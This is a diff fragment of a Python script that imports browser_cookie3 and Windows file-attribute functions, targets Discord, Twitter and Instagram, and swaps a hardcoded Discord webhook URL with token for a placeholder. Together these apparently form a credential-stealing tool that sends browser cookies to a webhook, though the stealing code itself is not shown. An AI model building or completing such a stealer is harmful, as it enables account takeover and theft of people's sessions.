@@ -17,7 +17,7 @@ import win32con
 from win32api import SetFileAttributes
 import browser_cookie3
 
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/999844698753597450/AHVskiawdGOp5MszJiYm-4zGLgpHxOphpffJZzaDquRvy03CKILlQeh5L1yNFwfFtVUF"
+DISCORD_WEBHOOK_URL = "YOUR DISCORD WEBHOOK URL"
 
 website = ['discord.com', 'twitter.com', 'instagram.com']
 
